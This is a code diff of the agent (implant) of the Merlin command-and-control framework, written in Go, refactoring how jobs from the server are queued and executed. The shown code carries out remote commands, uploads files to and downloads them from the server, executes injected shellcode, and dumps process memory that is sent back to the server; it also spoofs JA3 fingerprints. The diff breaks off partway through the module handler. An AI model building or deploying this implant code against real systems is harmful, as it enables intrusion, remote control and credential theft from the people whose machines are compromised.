@@ -57,7 +57,9 @@ import (
 	// Merlin
 	"github.com/Ne0nd0g/merlin/pkg"
 	"github.com/Ne0nd0g/merlin/pkg/core"
+	"github.com/Ne0nd0g/merlin/pkg/jobs"
 	"github.com/Ne0nd0g/merlin/pkg/messages"
+	"github.com/Ne0nd0g/merlin/pkg/opaque"
 )
 
 // GLOBAL VARIABLES
@@ -107,6 +109,8 @@ type Agent struct {
 	pwdU          []byte          // SHA256 hash from 5000 iterations of PBKDF2 with a 30 character random string input
 	psk           string          // Pre-Shared Key
 	JA3           string          // JA3 signature (not the MD5 hash) use to generate a JA3 client
+	inChan        chan jobs.Job   // A channel of input jobs for the agent to handle
+	outChan       chan jobs.Job   // A channel of output job results for the agent to send back to the server
 }
 
 // New creates a new agent struct with specific values and returns the object
@@ -133,6 +137,8 @@ func New(protocol string, url string, host string, psk string, proxy string, ja3
 		URL:          url,
 		Host:         host,
 		JA3:          ja3,
+		inChan:       make(chan jobs.Job, 100),
+		outChan:      make(chan jobs.Job, 100),
 	}
 
 	rand.Seed(time.Now().UnixNano())
@@ -220,6 +226,9 @@ func (a *Agent) Run() error {
 		message("note", fmt.Sprintf("Agent build: %s", build))
 	}
 
+	// Start go routine that checks for jobs or tasks to execute
+	go a.executeJob()
+
 	for {
 		// Check killdate to see if the agent should checkin
 		if (a.KillDate == 0) || (time.Now().Unix() < a.KillDate) {
@@ -227,7 +236,7 @@ func (a *Agent) Run() error {
 				if a.Verbose {
 					message("note", "Checking in...")
 				}
-				go a.statusCheckIn()
+				a.statusCheckIn()
 			} else {
 				a.initial = a.initialCheckIn()
 			}
@@ -253,6 +262,7 @@ func (a *Agent) Run() error {
 	}
 }
 
+// initialCheckin is the function that runs when an agent is first started to complete registration and authentication
 func (a *Agent) initialCheckIn() bool {
 
 	if a.Debug {
@@ -281,50 +291,8 @@ func (a *Agent) initialCheckIn() bool {
 		return false
 	}
 
-	// Now that the agent is authenticated, send in agent info
-	infoResponse, errAgentInfo := a.sendMessage("POST", a.getAgentInfoMessage())
-	if errAgentInfo != nil {
-		a.FailedCheckin++
-		if a.Verbose {
-			message("warn", errAgentInfo.Error())
-			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
-		}
-		return false
-	}
-	_, errHandler := a.messageHandler(infoResponse)
-	if errHandler != nil {
-		if a.Verbose {
-			message("warn", errHandler.Error())
-		}
-	}
-
-	// Send RSA keys encrypted using authentication derived secret
-	errRSA := a.rsaKeyExchange()
-	if errRSA != nil {
-		if a.Verbose {
-			message("warn", errRSA.Error())
-		}
-	}
-
-	if a.FailedCheckin > 0 && a.FailedCheckin < a.MaxRetry {
-		if a.Verbose {
-			message("note", fmt.Sprintf("Updating server with failed checkins from %d to 0", a.FailedCheckin))
-		}
-		a.FailedCheckin = 0
-		infoResponse, err := a.sendMessage("POST", a.getAgentInfoMessage())
-		if err != nil {
-			if a.Verbose {
-				message("warn", err.Error())
-			}
-			return false
-		}
-		_, errHandler2 := a.messageHandler(infoResponse)
-		if errHandler2 != nil {
-			if a.Verbose {
-				message("warn", errHandler2.Error())
-			}
-		}
-	}
+	// Force a status checkin to send the AgentInfo job that _should_ be in the channel
+	a.statusCheckIn()
 
 	if a.Debug {
 		message("debug", "Leaving initialCheckIn function, returning True")
@@ -333,19 +301,37 @@ func (a *Agent) initialCheckIn() bool {
 	return true
 }
 
+// statusCheckIn is the function that agent runs at every sleep/skew interval to check in with the server for jobs
 func (a *Agent) statusCheckIn() {
 	if a.Debug {
 		message("debug", "Entering into agent.statusCheckIn()")
 	}
 
-	statusMessage := messages.Base{
+	msg := messages.Base{
 		Version: 1.0,
 		ID:      a.ID,
-		Type:    "StatusCheckIn",
 		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
 	}
 
-	j, reqErr := a.sendMessage("POST", statusMessage)
+	// Check the output channel
+	var jobs []jobs.Job
+	for {
+		if len(a.outChan) > 0 {
+			job := <-a.outChan
+			jobs = append(jobs, job)
+		} else {
+			break
+		}
+	}
+
+	if len(jobs) > 0 {
+		msg.Type = messages.JOBS
+		msg.Payload = jobs
+	} else {
+		msg.Type = messages.CHECKIN
+	}
+
+	j, reqErr := a.sendMessage("POST", msg)
 
 	if reqErr != nil {
 		a.FailedCheckin++
@@ -354,6 +340,12 @@ func (a *Agent) statusCheckIn() {
 			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
 		}
 
+		// Put the jobs back into the queue if there was an error
+		if msg.Type == messages.JOBS {
+			for _, job := range jobs {
+				a.outChan <- job
+			}
+		}
 		// Handle HTTP3 Errors
 		if a.Proto == "http3" {
 			e := ""
@@ -402,31 +394,12 @@ func (a *Agent) statusCheckIn() {
 
 	if a.Debug {
 		message("debug", fmt.Sprintf("Agent ID: %s", j.ID))
-		message("debug", fmt.Sprintf("Message Type: %s", j.Type))
+		message("debug", fmt.Sprintf("Message Type: %s", messages.String(j.Type)))
 		message("debug", fmt.Sprintf("Message Payload: %s", j.Payload))
 	}
 
-	// handle message
-	m, err := a.messageHandler(j)
-	if err != nil {
-		if a.Verbose {
-			message("warn", err.Error())
-		}
-		return
-	}
-
-	// Used when the message was ServerOK, no further processing is needed
-	if m.Type == "" {
-		return
-	}
-
-	_, errR := a.sendMessage("post", m)
-	if errR != nil {
-		if a.Verbose {
-			message("warn", errR.Error())
-		}
-		return
-	}
+	// Handle message
+	a.messageHandler(j)
 
 }
 
@@ -544,7 +517,7 @@ func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, erro
 		message("debug", "Entering into agent.sendMessage()")
 	}
 	if a.Verbose {
-		message("note", fmt.Sprintf("Sending %s message to %s", m.Type, a.URL))
+		message("note", fmt.Sprintf("Sending %s message to %s", messages.String(m.Type), a.URL))
 	}
 
 	var returnMessage messages.Base
@@ -553,7 +526,7 @@ func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, erro
 	messageBytes := new(bytes.Buffer)
 	errGobEncode := gob.NewEncoder(messageBytes).Encode(m)
 	if errGobEncode != nil {
-		return returnMessage, fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", m.Type, errGobEncode.Error())
+		return returnMessage, fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", messages.String(m.Type), errGobEncode.Error())
 	}
 
 	// Get JWE
@@ -605,12 +578,16 @@ func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, erro
 			break
 		case 401:
 			if a.Verbose {
-				message("note", "server returned a 401, reauthenticating orphaned agent")
+				message("note", "server returned a 401, reAuthenticating orphaned agent")
 			}
+			// TODO Why don't I just start the re-authentication process now?
 			msg := messages.Base{
 				Version: 1.0,
 				ID:      a.ID,
-				Type:    "ReAuthenticate",
+				Type:    messages.OPAQUE, // OPAQUE_RE_AUTH
+				Payload: opaque.Opaque{
+					Type: opaque.ReAuthenticate,
+				},
 			}
 			return msg, err
 		default:
@@ -666,478 +643,617 @@ func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, erro
 	}
 }
 
-// messageHandler looks at the message type and performs the associated action
-func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
+// messageHandler processes an input message from the server and adds it to the job channel for processing by the agent
+func (a *Agent) messageHandler(m messages.Base) {
 	if a.Debug {
 		message("debug", "Entering into agent.messageHandler function")
 	}
 	if a.Verbose {
-		message("success", fmt.Sprintf("%s message type received!", m.Type))
+		message("success", fmt.Sprintf("%s message type received!", messages.String(m.Type)))
 	}
 
-	returnMessage := messages.Base{
-		Version: 1.0,
-		ID:      a.ID,
-		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
-	}
-
+	var results jobs.Results
 	if a.ID != m.ID {
-		return returnMessage, fmt.Errorf("the input message UUID did not match this agent's UUID %s:%s", a.ID, m.ID)
+		results.Stderr = fmt.Sprintf("the input message UUID did not match this agent's UUID %s:%s", a.ID, m.ID)
+		a.outChan <- jobs.Job{
+			AgentID: a.ID,
+			Type:    jobs.RESULT,
+			Payload: results,
+		}
+		return
 	}
-	var c messages.CmdResults
+
+	// Update the Agent's JWT
 	if m.Token != "" {
 		a.JWT = m.Token
 	}
 
 	switch m.Type {
-	case "FileTransfer":
-		p := m.Payload.(messages.FileTransfer)
-		c.Job = p.Job
-		// Agent will be downloading a file from the server
-		if p.IsDownload {
-			if a.Verbose {
-				message("note", "FileTransfer type: Download")
-			}
-
-			_, directoryPathErr := os.Stat(filepath.Dir(p.FileLocation))
-			if directoryPathErr != nil {
-				c.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the remote "+
-					"directory %s:\r\n", p.FileLocation)
-				c.Stderr += directoryPathErr.Error()
-			}
-			if c.Stderr == "" {
+	case messages.JOBS:
+		for _, job := range m.Payload.([]jobs.Job) {
+			// If the job belongs to this agent
+			if job.AgentID == a.ID {
 				if a.Verbose {
-					message("note", fmt.Sprintf("Writing file to %s", p.FileLocation))
+					message("success", fmt.Sprintf("%s job type received!", jobs.String(job.Type)))
 				}
-				downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(p.FileBlob)
-				if downloadFileErr != nil {
-					c.Stderr = downloadFileErr.Error()
-				} else {
-					errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0600)
-					if errF != nil {
-						c.Stderr = errF.Error()
+				switch job.Type {
+				case jobs.FILETRANSFER:
+					a.inChan <- job
+				case jobs.CMD:
+					a.inChan <- job
+				case jobs.MODULE:
+					a.inChan <- job
+				case jobs.CONTROL:
+					// Intend for Agent Control messages to block and not use the input job channel
+					//a.inChan <- job
+					a.agentControl(job)
+				case jobs.SHELLCODE:
+					if a.Verbose {
+						message("note", "Received Execute shellcode command")
+					}
+					a.inChan <- job
+				case jobs.NATIVE:
+					if job.Payload.(jobs.Command).Command == "agentInfo" {
+						a.getAgentInfoMessage(job)
 					} else {
-						c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent %s", p.FileLocation, a.ID.String())
+						a.inChan <- job
+					}
+				default:
+					var results jobs.Results
+					results.Stderr = fmt.Sprintf("%s is not a valid message type", messages.String(m.Type))
+					a.outChan <- jobs.Job{
+						ID:      job.ID,
+						AgentID: a.ID,
+						Token:   job.Token,
+						Type:    jobs.RESULT,
+						Payload: results,
 					}
 				}
-			}
-		}
-		// Agent will uploading a file to the server
-		if !p.IsDownload {
-			if a.Verbose {
-				message("note", "FileTransfer type: Upload")
-			}
-
-			fileData, fileDataErr := ioutil.ReadFile(p.FileLocation)
-			if fileDataErr != nil {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("There was an error reading %s", p.FileLocation))
-					message("warn", fileDataErr.Error())
-				}
-				c.Stderr = fmt.Sprintf("there was an error reading %s:\r\n%s", p.FileLocation, fileDataErr.Error())
 			} else {
-				fileHash := sha1.New() // #nosec G401 // Use SHA1 because it is what many Blue Team tools use
-				_, errW := io.WriteString(fileHash, string(fileData))
-				if errW != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error generating the SHA1 file hash e:\r\n%s", errW.Error()))
-					}
-				}
-
-				if a.Verbose {
-					message("note", fmt.Sprintf("Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
-						p.FileLocation,
-						len(fileData),
-						fileHash.Sum(nil)))
-				}
-				ft := messages.FileTransfer{
-					FileLocation: p.FileLocation,
-					FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
-					IsDownload:   true,
-					Job:          p.Job,
-				}
-
-				returnMessage.Type = "FileTransfer"
-				returnMessage.Payload = ft
-				return returnMessage, nil
+				// If the job belongs to a linked agent
+				// NOT IMPLEMENTED YET
 			}
 		}
-	case "CmdPayload":
-		p := m.Payload.(messages.CmdPayload)
-		c.Job = p.Job
-		c.Stdout, c.Stderr = a.executeCommand(p)
-	case "ServerOk":
+	case messages.IDLE:
 		if a.Verbose {
-			message("note", "Received Server OK, doing nothing")
+			message("note", "Received idle command, doing nothing")
 		}
-		return returnMessage, nil
-	case "Module":
-		if a.Verbose {
-			message("note", "Received Agent Module Directive")
-		}
-		p := m.Payload.(messages.Module)
-		c.Job = p.Job
-		switch p.Command {
-		case "CreateProcess":
-			if a.Verbose {
-				message("note", "Received CreateProcess request")
-			}
-			//ensure the provided args are valid
-			if len(p.Args) < 2 {
-				//not enough args
-				c.Stderr = "not enough arguments provided to the createProcess module to dump a process"
-				break
-			}
-			var err error
-			// 1. Shellcode
-			// 2. SpawnTo Executable
-			// 3. SpawnTo Arguments
-			c.Stdout, c.Stderr, err = ExecuteShellcodeCreateProcessWithPipe(p.Args[0], p.Args[1], p.Args[2])
+	case messages.OPAQUE:
+		if m.Payload.(opaque.Opaque).Type == opaque.ReAuthenticate {
+			err := a.opaqueAuthenticate()
 			if err != nil {
-				c.Stderr = err.Error()
-			}
-		case "Minidump":
-			if a.Verbose {
-				message("note", "Received Minidump request")
-			}
-
-			//ensure the provided args are valid
-			if len(p.Args) < 2 {
-				//not enough args
-				c.Stderr = "not enough arguments provided to the Minidump module to dump a process"
-				break
-			}
-			process := p.Args[0]
-			pid, err := strconv.ParseInt(p.Args[1], 0, 32)
-			if err != nil {
-				c.Stderr = fmt.Sprintf("minidump module could not parse PID as an integer:%s\r\n%s", p.Args[1], err.Error())
-				break
-			}
-
-			tempPath := ""
-			if len(p.Args) == 3 {
-				tempPath = p.Args[2]
-			}
-
-			// Get minidump
-			miniD, miniDumpErr := miniDump(tempPath, process, uint32(pid))
-
-			//copied and pasted from upload func, modified appropriately
-			if miniDumpErr != nil {
-				c.Stderr = fmt.Sprintf("There was an error executing the miniDump module:\r\n%s",
-					miniDumpErr.Error())
-			} else {
-				fileHash := sha256.New()
-				_, errW := io.WriteString(fileHash, string(miniD["FileContent"].([]byte)))
-				if errW != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error generating the SHA256 file hash e:\r\n%s", errW.Error()))
-					}
-				}
-
-				if a.Verbose {
-					message("note", fmt.Sprintf("Uploading minidump file of size %d bytes and a SHA1 hash of %x to the server",
-						len(miniD["FileContent"].([]byte)),
-						fileHash.Sum(nil)))
-				}
-				fileTransferMessage := messages.FileTransfer{
-					FileLocation: fmt.Sprintf("%s.%d.dmp", miniD["ProcName"], miniD["ProcID"]),
-					FileBlob:     base64.StdEncoding.EncodeToString(miniD["FileContent"].([]byte)),
-					IsDownload:   true,
-					Job:          p.Job,
-				}
-
-				returnMessage.Type = "FileTransfer"
-				returnMessage.Payload = fileTransferMessage
-				return returnMessage, nil
-			}
-		default:
-			c.Stderr = fmt.Sprintf("%s is not a valid module type", p.Command)
-		}
-	case "AgentControl":
-		if a.Verbose {
-			message("note", "Received Agent Control Message")
-		}
-		p := m.Payload.(messages.AgentControl)
-		c.Job = p.Job
-		switch p.Command {
-		case "kill":
-			if a.Verbose {
-				message("note", "Received Agent Kill Message")
-			}
-			os.Exit(0)
-		case "sleep":
-			if a.Verbose {
-				message("note", fmt.Sprintf("Setting agent sleep time to %s", p.Args))
-			}
-			t, err := time.ParseDuration(p.Args)
-			if err != nil {
-				c.Stderr = fmt.Sprintf("there was an error changing the agent waitTime:\r\n%s", err.Error())
-				break
-			}
-			if t > 0 {
-				a.WaitTime = t
-			} else {
-				c.Stderr = fmt.Sprintf("the agent was provided with a time that was not greater than zero:\r\n%s", t.String())
-				break
-			}
-		case "skew":
-			t, err := strconv.ParseInt(p.Args, 10, 64)
-			if err != nil {
-				c.Stderr = fmt.Sprintf("there was an error changing the agent skew interval:\r\n%s", err.Error())
-				break
-			}
-			if a.Verbose {
-				message("note", fmt.Sprintf("Setting agent skew interval to %d", t))
-			}
-			a.Skew = t
-		case "padding":
-			t, err := strconv.Atoi(p.Args)
-			if err != nil {
-				c.Stderr = fmt.Sprintf("there was an error changing the agent message padding size:\r\n%s", err.Error())
-				break
-			}
-			if a.Verbose {
-				message("note", fmt.Sprintf("Setting agent message maximum padding size to %d", t))
-			}
-			a.PaddingMax = t
-		case "initialize":
-			if a.Verbose {
-				message("note", "Received agent re-initialize message")
-			}
-			a.initial = false
-		case "maxretry":
-			t, err := strconv.Atoi(p.Args)
-			if err != nil {
-				c.Stderr = fmt.Sprintf("There was an error changing the agent max retries:\r\n%s", err.Error())
-				break
-			}
-			if a.Verbose {
-				message("note", fmt.Sprintf("Setting agent max retries to %d", t))
-			}
-			a.MaxRetry = t
-		case "killdate":
-			d, err := strconv.Atoi(p.Args)
-			if err != nil {
-				c.Stderr = fmt.Sprintf("there was an error converting the kill date to an integer:\r\n%s", err.Error())
-				break
-			}
-			a.KillDate = int64(d)
-			if a.Verbose {
-				message("info", fmt.Sprintf("Set Kill Date to: %s",
-					time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
-			}
-		case "ja3":
-			a.JA3 = strings.Trim(p.Args, "\"'")
-
-			//Update the client
-			var err error
-
-			a.Client, err = getClient(a.Proto, "", a.JA3)
-
-			if err != nil {
-				c.Stderr = fmt.Sprintf("there was an error setting the agent client:\r\n%s", err.Error())
-				break
-			}
-
-			if a.Verbose && a.JA3 != "" {
-				message("note", fmt.Sprintf("Set agent JA3 signature to:%s", a.JA3))
-			} else if a.Verbose && a.JA3 == "" {
-				message("note", fmt.Sprintf("Setting agent client back to default using %s protocol", a.Proto))
-			}
-		default:
-			c.Stderr = fmt.Sprintf("%s is not a valid AgentControl message type.", p.Command)
-		}
-		return a.getAgentInfoMessage(), nil
-	case "Shellcode":
-		if a.Verbose {
-			message("note", "Received Execute shellcode command")
-		}
-
-		s := m.Payload.(messages.Shellcode)
-		var e error
-		c.Job = s.Job
-		e = a.executeShellcode(s) // Execution method determined in function
-
-		if e != nil {
-			c.Stderr = fmt.Sprintf("there was an error with the shellcode module:\r\n%s", e.Error())
-		} else {
-			c.Stdout = "Shellcode module executed without errors"
-		}
-	case "NativeCmd":
-		p := m.Payload.(messages.NativeCmd)
-		c.Job = p.Job
-		switch p.Command {
-		case "ls":
-			listing, err := a.list(p.Args)
-			if err != nil {
-				c.Stderr = fmt.Sprintf("there was an error executing the 'ls' command:\r\n%s", err.Error())
-				break
-			}
-			c.Stdout = listing
-		case "cd":
-			err := os.Chdir(p.Args)
-			if err != nil {
-				c.Stderr = fmt.Sprintf("there was an error changing directories when executing the 'cd' command:\r\n%s", err.Error())
-			} else {
-				path, pathErr := os.Getwd()
-				if pathErr != nil {
-					c.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'cd' command:\r\n%s", pathErr.Error())
-				} else {
-					c.Stdout = fmt.Sprintf("Changed working directory to %s", path)
+				a.FailedCheckin++
+				results.Stderr = err.Error()
+				a.outChan <- jobs.Job{
+					AgentID: a.ID,
+					Type:    jobs.RESULT,
+					Payload: results,
 				}
 			}
-		case "pwd":
-			dir, err := os.Getwd()
-			if err != nil {
-				c.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'pwd' command:\r\n%s", err.Error())
-			} else {
-				c.Stdout = fmt.Sprintf("Current working directory: %s", dir)
-			}
-		default:
-			c.Stderr = fmt.Sprintf("%s is not a valid NativeCMD type", p.Command)
 		}
-	case "KeyExchange":
-		p := m.Payload.(messages.KeyExchange)
-		a.PublicKey = p.PublicKey
-		return returnMessage, nil
-	case "ReAuthenticate":
-		if a.Verbose {
-			message("note", "Re-authenticating with OPAQUE protocol")
-		}
-
-		errAuth := a.opaqueAuthenticate()
-		if errAuth != nil {
-			return returnMessage, fmt.Errorf("there was an error during OPAQUE Re-Authentication:\r\n%s", errAuth)
-		}
-		m.Type = ""
-		return returnMessage, nil
 	default:
-		return returnMessage, fmt.Errorf("%s is not a valid message type", m.Type)
+		results.Stderr = fmt.Sprintf("%s is not a valid message type", messages.String(m.Type))
+		a.outChan <- jobs.Job{
+			AgentID: a.ID,
+			Type:    jobs.RESULT,
+			Payload: results,
+		}
 	}
 
-	if a.Verbose && c.Stdout != "" {
-		message("success", c.Stdout)
-	}
-	if a.Verbose && c.Stderr != "" {
-		message("warn", c.Stderr)
-	}
-
-	returnMessage.Type = "CmdResults"
-	returnMessage.Payload = c
 	if a.Debug {
 		message("debug", "Leaving agent.messageHandler function without error")
 	}
-	return returnMessage, nil
 }
 
-func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
-	if a.Debug {
-		message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))
+// executeJob is executed a go routine that regularly checks for jobs from the in channel, executes them, and returns results to the out channel
+func (a *Agent) executeJob() {
+	for {
+		job := <-a.inChan
+		switch job.Type {
+		case jobs.CMD:
+			a.executeCommand(job)
+		case jobs.CONTROL:
+			a.agentControl(job)
+		case jobs.FILETRANSFER:
+			a.fileTransfer(job)
+		case jobs.MODULE:
+			a.runModule(job)
+		case jobs.NATIVE:
+			a.nativeCommand(job)
+		case jobs.SHELLCODE:
+			a.executeShellcode(job)
+		default:
+			result := jobs.Results{Stderr: fmt.Sprintf("Invalid job type: %d", job.Type)}
+			a.outChan <- jobs.Job{
+				AgentID: a.ID,
+				ID:      job.ID,
+				Type:    jobs.RESULT,
+				Payload: result,
+			}
+		}
+	}
+}
 
-	} else if a.Verbose {
-		message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
+// executeCommand runs the provided input program and arguments, returning results in a message base
+func (a *Agent) executeCommand(job jobs.Job) {
+	if a.Debug {
+		message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %+v", job))
+
+	}
+	cmd := job.Payload.(jobs.Command)
+	if a.Verbose {
+		message("success", fmt.Sprintf("Executing command: %s %s", cmd.Command, cmd.Args))
 	}
 
-	stdout, stderr = ExecuteCommand(j.Command, j.Args)
+	var results jobs.Results
+	results.Stdout, results.Stderr = ExecuteCommand(cmd.Command, cmd.Args)
 
 	if a.Verbose {
-		if stderr != "" {
-			message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
-			message("success", stdout)
-			message("warn", fmt.Sprintf("Error: %s", stderr))
+		if results.Stderr != "" {
+			message("warn", fmt.Sprintf("There was an error executing the command: %s %s", cmd.Command, cmd.Args))
+			message("success", results.Stdout)
+			message("warn", fmt.Sprintf("Error: %s", results.Stderr))
 
 		} else {
-			message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
+			message("success", fmt.Sprintf("Command output:\r\n\r\n%s", results.Stdout))
 		}
 	}
 
-	return stdout, stderr
+	a.outChan <- jobs.Job{
+		ID:      job.ID,
+		AgentID: a.ID,
+		Token:   job.Token,
+		Type:    jobs.RESULT,
+		Payload: results,
+	}
 }
 
-func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
+// fileTransfer executes the file transfer job and returns results to job channel
+func (a *Agent) fileTransfer(job jobs.Job) {
+	var result jobs.Results
+	transfer := job.Payload.(jobs.FileTransfer)
+	// Agent will be downloading a file from the server
+	if transfer.IsDownload {
+		if a.Verbose {
+			message("note", "FileTransfer type: Download")
+		}
 
-	if a.Debug {
-		message("debug", fmt.Sprintf("Received input parameter for executeShellcode function: %v", shellcode))
+		_, directoryPathErr := os.Stat(filepath.Dir(transfer.FileLocation))
+		if directoryPathErr != nil {
+			result.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the remote "+
+				"directory %s:\r\n", transfer.FileLocation)
+			result.Stderr += directoryPathErr.Error()
+		}
+		if result.Stderr == "" {
+			if a.Verbose {
+				message("note", fmt.Sprintf("Writing file to %s", transfer.FileLocation))
+			}
+			downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(transfer.FileBlob)
+			if downloadFileErr != nil {
+				result.Stderr = downloadFileErr.Error()
+			} else {
+				errF := ioutil.WriteFile(transfer.FileLocation, downloadFile, 0600)
+				if errF != nil {
+					result.Stderr = errF.Error()
+				} else {
+					result.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent %s", transfer.FileLocation, a.ID.String())
+				}
+			}
+		}
+		a.outChan <- jobs.Job{
+			ID:      job.ID,
+			AgentID: a.ID,
+			Type:    jobs.RESULT,
+			Payload: result,
+		}
+		return
 	}
 
-	shellcodeBytes, errDecode := base64.StdEncoding.DecodeString(shellcode.Bytes)
+	// Agent will uploading a file to the server
+	if a.Verbose {
+		message("note", "FileTransfer type: Upload")
+	}
 
-	if errDecode != nil {
+	fileData, fileDataErr := ioutil.ReadFile(transfer.FileLocation)
+	if fileDataErr != nil {
 		if a.Verbose {
-			message("warn", fmt.Sprintf("There was an error decoding the Base64 string: %s", shellcode.Bytes))
-			message("warn", errDecode.Error())
+			message("warn", fmt.Sprintf("There was an error reading %s", transfer.FileLocation))
+			message("warn", fileDataErr.Error())
 		}
-		return errDecode
+		result.Stderr = fmt.Sprintf("there was an error reading %s:\r\n%s", transfer.FileLocation, fileDataErr.Error())
+	} else {
+		fileHash := sha1.New() // #nosec G401 // Use SHA1 because it is what many Blue Team tools use
+		_, errW := io.WriteString(fileHash, string(fileData))
+		if errW != nil {
+			if a.Verbose {
+				message("warn", fmt.Sprintf("There was an error generating the SHA1 file hash e:\r\n%s", errW.Error()))
+			}
+		}
+
+		if a.Verbose {
+			message("note", fmt.Sprintf("Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
+				transfer.FileLocation,
+				len(fileData),
+				fileHash.Sum(nil)))
+		}
+		ft := jobs.FileTransfer{
+			FileLocation: transfer.FileLocation,
+			FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
+			IsDownload:   true,
+		}
+
+		a.outChan <- jobs.Job{
+			ID:      job.ID,
+			AgentID: a.ID,
+			Token:   job.Token,
+			Type:    jobs.FILETRANSFER,
+			Payload: ft,
+		}
+		return
+	}
+	a.outChan <- jobs.Job{
+		ID:      job.ID,
+		AgentID: a.ID,
+		Token:   job.Token,
+		Type:    jobs.RESULT,
+		Payload: result,
+	}
+}
+
+// nativeCommand executes a golang native command that does not use any executables on the host
+func (a *Agent) nativeCommand(job jobs.Job) {
+	var results jobs.Results
+	cmd := job.Payload.(jobs.Command)
+	if a.Verbose {
+		message("note", fmt.Sprintf("Executing native command: %s", cmd.Command))
+	}
+	switch cmd.Command {
+	// TODO create a function for each Native Command that returns a string and error and DOES NOT use (a *Agent)
+	case "agentInfo":
+		a.getAgentInfoMessage(job)
+	case "ls":
+		listing, err := a.list(cmd.Args[0])
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error executing the 'ls' command:\r\n%s", err.Error())
+			break
+		}
+		results.Stdout = listing
+	case "cd":
+		err := os.Chdir(cmd.Args[0])
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error changing directories when executing the 'cd' command:\r\n%s", err.Error())
+		} else {
+			path, pathErr := os.Getwd()
+			if pathErr != nil {
+				results.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'cd' command:\r\n%s", pathErr.Error())
+			} else {
+				results.Stdout = fmt.Sprintf("Changed working directory to %s", path)
+			}
+		}
+	case "pwd":
+		dir, err := os.Getwd()
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'pwd' command:\r\n%s", err.Error())
+		} else {
+			results.Stdout = fmt.Sprintf("Current working directory: %s", dir)
+		}
+	default:
+		results.Stderr = fmt.Sprintf("%s is not a valid NativeCMD type", cmd.Command)
+	}
+	if a.Verbose {
+		if results.Stderr == "" {
+			message("success", results.Stdout)
+
+		} else {
+			message("warn", results.Stderr)
+		}
+	}
+	a.outChan <- jobs.Job{
+		ID:      job.ID,
+		AgentID: a.ID,
+		Token:   job.Token,
+		Type:    jobs.RESULT,
+		Payload: results,
+	}
+}
+
+// runModule parsed the module message type and executes the corresponding extended module
+func (a *Agent) runModule(job jobs.Job) {
+	cmd := job.Payload.(jobs.Command)
+	if a.Verbose {
+		message("note", fmt.Sprintf("Executing module: %s", cmd.Command))
+	}
+
+	var results jobs.Results
+
+	switch cmd.Command {
+	case "CreateProcess":
+		//ensure the provided args are valid
+		if len(cmd.Args) < 2 {
+			//not enough args
+			results.Stderr = "not enough arguments provided to the createProcess module to dump a process"
+			break
+		}
+		var err error
+		// 1. Shellcode
+		// 2. SpawnTo Executable
+		// 3. SpawnTo Arguments
+		results.Stdout, results.Stderr, err = ExecuteShellcodeCreateProcessWithPipe(cmd.Args[0], cmd.Args[1], cmd.Args[2])
+		if err != nil {
+			results.Stderr = err.Error()
+		}
+	case "Minidump":
+		if a.Verbose {
+			message("note", "Received Minidump request")
+		}
+
+		//ensure the provided args are valid
+		if len(cmd.Args) < 2 {
+			//not enough args
+			results.Stderr = "not enough arguments provided to the Minidump module to dump a process"
+			break
+		}
+		process := cmd.Args[0]
+		pid, err := strconv.ParseInt(cmd.Args[1], 0, 32)
+		if err != nil {
+			results.Stderr = fmt.Sprintf("minidump module could not parse PID as an integer:%s\r\n%s", cmd.Args[1], err.Error())
+			break
+		}
+
+		tempPath := ""
+		if len(cmd.Args) == 3 {
+			tempPath = cmd.Args[2]
+		}
+
+		// Get minidump
+		miniD, miniDumpErr := miniDump(tempPath, process, uint32(pid))
+
+		//copied and pasted from upload func, modified appropriately
+		if miniDumpErr != nil {
+			results.Stderr = fmt.Sprintf("There was an error executing the miniDump module:\r\n%s",
+				miniDumpErr.Error())
+		} else {
+			fileHash := sha256.New()
+			_, errW := io.WriteString(fileHash, string(miniD["FileContent"].([]byte)))
+			if errW != nil {
+				if a.Verbose {
+					message("warn", fmt.Sprintf("There was an error generating the SHA256 file hash e:\r\n%s", errW.Error()))
+				}
+			}
+
+			if a.Verbose {
+				message("note", fmt.Sprintf("Uploading minidump file of size %d bytes and a SHA1 hash of %x to the server",
+					len(miniD["FileContent"].([]byte)),
+					fileHash.Sum(nil)))
+			}
+			fileTransferMessage := jobs.FileTransfer{
+				FileLocation: fmt.Sprintf("%s.%d.dmp", miniD["ProcName"], miniD["ProcID"]),
+				FileBlob:     base64.StdEncoding.EncodeToString(miniD["FileContent"].([]byte)),
+				IsDownload:   true,
+			}
